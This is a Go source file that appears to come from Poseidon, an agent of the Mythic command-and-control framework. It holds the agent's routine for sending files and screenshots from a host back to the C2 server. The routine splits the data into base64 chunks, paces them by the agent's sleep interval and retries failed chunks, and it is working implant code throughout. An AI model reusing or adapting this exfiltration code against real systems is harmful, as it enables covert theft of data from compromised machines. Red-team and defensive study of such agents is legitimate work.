package files

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
	"io"
	"math"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

var SendToMythicChannel = make(chan structs.SendFileToMythicStruct, 10)

// listenForSendFileToMythicMessages reads from SendToMythicChannel to send file transfer messages to Mythic
func listenForSendFileToMythicMessages() {
	for {
		select {
		case fileToMythic := <-SendToMythicChannel:
			fileToMythic.TrackingUUID = utils.GenerateSessionID()
			fileToMythic.FileTransferResponse = make(chan json.RawMessage)
			fileToMythic.Task.Job.FileTransfers[fileToMythic.TrackingUUID] = fileToMythic.FileTransferResponse
			go sendFileMessagesToMythic(fileToMythic)
		}
	}
}

// sendFileToMythic constructs a file transfer message to send to Mythic
func sendFileMessagesToMythic(sendFileToMythic structs.SendFileToMythicStruct) {
	var size int64
	if sendFileToMythic.Data == nil {
		if sendFileToMythic.File == nil {
			errResponse := sendFileToMythic.Task.NewResponse()
			errResponse.UserOutput = fmt.Sprintf("No data and no file specified when trying to send a file to Mythic")
			sendFileToMythic.Task.Job.SendResponses <- errResponse
			sendFileToMythic.FinishedTransfer <- 1
			return
		} else {
			fi, err := sendFileToMythic.File.Stat()
			if err != nil {
				errResponse := structs.Response{}
				errResponse.Completed = true
				errResponse.TaskID = sendFileToMythic.Task.TaskID
				errResponse.UserOutput = fmt.Sprintf("Error getting file size: %s", err.Error())
				sendFileToMythic.Task.Job.SendResponses <- errResponse
				sendFileToMythic.FinishedTransfer <- 1
				return
			}
			size = fi.Size()
		}
	} else {
		size = int64(len(*sendFileToMythic.Data))
	}

	chunks := uint64(math.Ceil(float64(size) / FILE_CHUNK_SIZE))
	fileDownloadData := structs.FileDownloadMessage{}
	fileDownloadData.TotalChunks = int(chunks)
	fileDownloadData.FullPath = sendFileToMythic.FullPath
	if sendFileToMythic.FullPath != "" {
		abspath, err := filepath.Abs(sendFileToMythic.FullPath)
		if err != nil {
			errResponse := sendFileToMythic.Task.NewResponse()
			errResponse.SetError(fmt.Sprintf("Error getting full path to file: %s", err.Error()))
			sendFileToMythic.Task.Job.SendResponses <- errResponse
			sendFileToMythic.FinishedTransfer <- 1
			return
		}
		fileDownloadData.FullPath = abspath
	}
	fileDownloadData.IsScreenshot = sendFileToMythic.IsScreenshot
	fileDownloadData.FileName = sendFileToMythic.FileName
	// create our normal response message and add our Download part to it
	fileDownloadMsg := structs.Response{}
	fileDownloadMsg.TaskID = sendFileToMythic.Task.TaskID
	fileDownloadMsg.Download = &fileDownloadData
	fileDownloadMsg.TrackingUUID = sendFileToMythic.TrackingUUID
	// send the initial message to Mythic to announce we have a file to transfer
	sendFileToMythic.Task.Job.SendResponses <- fileDownloadMsg

	var fileDetails map[string]interface{}

	for {
		// Wait for a response from the channel
		resp := <-sendFileToMythic.FileTransferResponse
		err := json.Unmarshal(resp, &fileDetails)
		//fmt.Printf("Got %v back from file download first response", fileDetails)
		if err != nil {
			errResponse := sendFileToMythic.Task.NewResponse()
			errResponse.SetError(fmt.Sprintf("Error unmarshaling task response: %s", err.Error()))
			sendFileToMythic.Task.Job.SendResponses <- errResponse
			sendFileToMythic.FinishedTransfer <- 1
			return
		}

		//log.Printf("Receive file download registration response %s\n", resp)
		if _, ok := fileDetails["file_id"]; ok {
			if ok {
				updateUserOutput := structs.Response{}
				updateUserOutput.TaskID = sendFileToMythic.Task.TaskID
				updateUserOutput.UserOutput = "{\"file_id\": \"" + fmt.Sprintf("%v", fileDetails["file_id"]) + "\", \"total_chunks\": \"" + strconv.Itoa(int(chunks)) + "\"}\n"
				sendFileToMythic.Task.Job.SendResponses <- updateUserOutput
				break
			} else {
				//log.Println("Didn't find response with file_id key")
				continue
			}
		}
	}
	var r *bytes.Buffer = nil
	if sendFileToMythic.Data != nil {
		r = bytes.NewBuffer(*sendFileToMythic.Data)
	} else {
		sendFileToMythic.File.Seek(0, 0)
	}
	lastPercentCompleteNotified := 0
	for i := uint64(0); i < chunks; {
		if sendFileToMythic.Task.ShouldStop() {
			// tasked to stop, so bail
			sendFileToMythic.FinishedTransfer <- 1
			return
		}
		time.Sleep(time.Duration(profiles.GetSleepTime()) * time.Second)
		partSize := int(math.Min(FILE_CHUNK_SIZE, float64(int64(size)-int64(i*FILE_CHUNK_SIZE))))
		partBuffer := make([]byte, partSize)
		// Create a temporary buffer and read a chunk into that buffer from the file
		if sendFileToMythic.Data != nil {
			_, err := r.Read(partBuffer)
			if err != io.EOF && err != nil {
				errResponse := sendFileToMythic.Task.NewResponse()
				errResponse.SetError(fmt.Sprintf("\nError reading from file: %s\n", err.Error()))
				sendFileToMythic.Task.Job.SendResponses <- errResponse
				sendFileToMythic.FinishedTransfer <- 1
				return
			}
		} else {
			// Skipping i*FILE_CHUNK_SIZE bytes from the begging of the file, os.SeekStart, 0
			sendFileToMythic.File.Seek(int64(i*FILE_CHUNK_SIZE), 0)
			_, err := sendFileToMythic.File.Read(partBuffer)
			if err != io.EOF && err != nil {
				errResponse := sendFileToMythic.Task.NewResponse()
				errResponse.SetError(fmt.Sprintf("\nError reading from file: %s\n", err.Error()))
				sendFileToMythic.Task.Job.SendResponses <- errResponse
				sendFileToMythic.FinishedTransfer <- 1
				return
			}
		}

		fileDownloadData = structs.FileDownloadMessage{}
		fileDownloadData.ChunkNum = int(i) + 1
		//fileDownloadData.TotalChunks = -1
		fileDownloadData.FileID = fileDetails["file_id"].(string)
		fileDownloadData.ChunkData = base64.StdEncoding.EncodeToString(partBuffer)
		fileDownloadMsg.Download = &fileDownloadData
		sendFileToMythic.Task.Job.SendResponses <- fileDownloadMsg
		newPercentComplete := ((fileDownloadData.ChunkNum * 100) / int(chunks))
		if newPercentComplete/10 > lastPercentCompleteNotified && sendFileToMythic.SendUserStatusUpdates {
			response := sendFileToMythic.Task.NewResponse()
			response.Completed = false
			response.UserOutput = fmt.Sprintf("File Transfer Update: %d%% complete\n", newPercentComplete)
			sendFileToMythic.Task.Job.SendResponses <- response
			lastPercentCompleteNotified = newPercentComplete / 10
		}
		// Wait for a response for our file chunk
		var postResp map[string]interface{}
		for {
			decResp := <-sendFileToMythic.FileTransferResponse
			err := json.Unmarshal(decResp, &postResp) // Wait for a response for our file chunk

			if err != nil {
				errResponse := sendFileToMythic.Task.NewResponse()
				errResponse.Completed = true
				errResponse.UserOutput = fmt.Sprintf("Error unmarshaling task response: %s", err.Error())
				sendFileToMythic.Task.Job.SendResponses <- errResponse
				sendFileToMythic.FinishedTransfer <- 1
				return
			}
			break
		}

		if strings.Contains(postResp["status"].(string), "success") {
			// only go to the next chunk if this one was successful
			i++
		}
	}
	sendFileToMythic.FinishedTransfer <- 1
	return
}
